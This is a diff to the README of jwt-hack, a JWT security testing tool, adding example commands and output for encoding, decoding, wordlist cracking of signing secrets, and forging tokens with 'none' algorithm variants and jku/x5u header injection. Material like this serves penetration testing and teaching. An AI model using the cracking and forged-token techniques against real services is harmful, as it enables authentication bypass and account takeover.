@@ -33,20 +33,100 @@ Flags:
   -h, --help   help for jwt-hack
 ```
 
+![1414](https://user-images.githubusercontent.com/13212227/91735126-cd719580-ebe6-11ea-83fc-9fa49ece37ea.png)
+
 ## Encode mode(JSON to JWT)
 ```
-$ jwt-hack encode '{"test":"1234"}' --secret=asdf
+$ jwt-hack encode '{"json":"format"}' --secret={YOUR_SECRET}
 ```
+
+e.g
+```
+$ jwt-hack encode '{"test":"1234"}' --secret=asdf
+   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
+   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
+   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
+88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
+-------------------------
+INFO[0000] Encoded result                                algorithm=HS256
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXN0IjoiMTIzNCJ9.JOL1SYkRZYUz9GVny-DgoDj60C0RLz929h1_fFcpqQA
+```
+
 ## Decode mode(JWT to JSON)
 ```
-$ jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+$ jwt-hack decode {JWT_CODE}
 ```
+
+e.g 
+```
+$ jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
+   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
+   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
+88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
+-------------------------
+INFO[0000] Decoded data(claims)                          header="{\"alg\":\"HS256\",\"typ\":\"JWT\"}" method="&{HS256 5}"
+{"iat":1516239022,"name":"John Doe","sub":"1234567890"}
+```
+
 ## Crack mode(Dictionary attack / BruteForce)
 ```
-$ jwt-hack crack -w 1.lst eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.cq-uoLxOu3V4RjxnbUAFZ36aSZ24BXiAH8RFDYVA6XU
+$ jwt-hack crack -w {WORDLIST} {JWT_CODE}
+```
+
+e.g
+```
+$ jwt-hack crack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA -w samples/wordlist.txt
+
+   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
+   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
+   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
+88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
+-------------------------
+[*] Start dict cracking mode
+INFO[0000] Loaded words (remove duplicated)              size=16
+INFO[0000] Invalid signature                             word=fas
+INFO[0000] Invalid signature                             word=asd
+INFO[0000] Invalid signature                             word=1234
+INFO[0000] Invalid signature                             word=efq
+INFO[0000] Invalid signature                             word=asdf
+INFO[0000] Invalid signature                             word=2q
+INFO[0000] Found! This JWT Token signature secret is..   Signature=Verified Word=test
+test
+INFO[0000] Invalid signature                             word=dfas
+INFO[0000] Invalid signature                             word=ga
+INFO[0000] Invalid signature                             word=f
+INFO[0000] Invalid signature                             word=ds
+INFO[0000] Invalid signature                             word=sad
+INFO[0000] Invalid signature                             word=qsf
+INFO[0000] Invalid signature                             word=df
+INFO[0000] Invalid signature                             word=zx
+[+] Finish crack mode
 ```
 
 ## Payload mode(Alg none attack, etc..)
 ```
-$ jwt-hack payload eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+$ jwt-hack payload {JWT_CODE}
+```
+
+e.g
+```
+$ jwt-hack payload eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5mhBHqs5_DTLdINd9p5m7ZJ6XD0Xc55kIaCRY5r6HRA
+   d8p 8d8   d88 888888888          888  888 ,8b.     doooooo 888  ,dP
+   88p 888,o.d88    '88d     ______ 88888888 88'8o    d88     888o8P'
+   88P 888P`Y8b8   '888      XXXXXX 88P  888 88PPY8.  d88     888 Y8L
+88888' 88P   YP8 '88p               88P  888 8b   `Y' d888888 888  `8p
+-------------------------
+payload called
+INFO[0000] Generate none payload                         header="{\"alg\":\"none\",\"typ\":\"JWT\"}" payload=none
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+INFO[0000] Generate NonE payload                         header="{\"alg\":\"NonE\",\"typ\":\"JWT\"}" payload=NonE
+eyJhbGciOiJOb25FIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+INFO[0000] Generate NONE payload                         header="{\"alg\":\"NONE\",\"typ\":\"JWT\"}" payload=NONE
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0=.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+INFO[0000] Generate jku payload                          header="{\"alg\":\"hs256\",\"jku\":\"https://www.google.com\",\"typ\":\"JWT\"}" payload=jku
+eyJhbGciOiJoczI1NiIsImprdSI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20iLCJ0eXAiOiJKV1QifQ==.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
+INFO[0000] Generate x5u payload                          header="{\"alg\":\"hs256\",\"x5u\":\"https://www.google.com\",\"typ\":\"JWT\"}" payload=x5u
+eyJhbGciOiJoczI1NiIsIng1dSI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20iLCJ0eXAiOiJKV1QifQ==.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
 ```
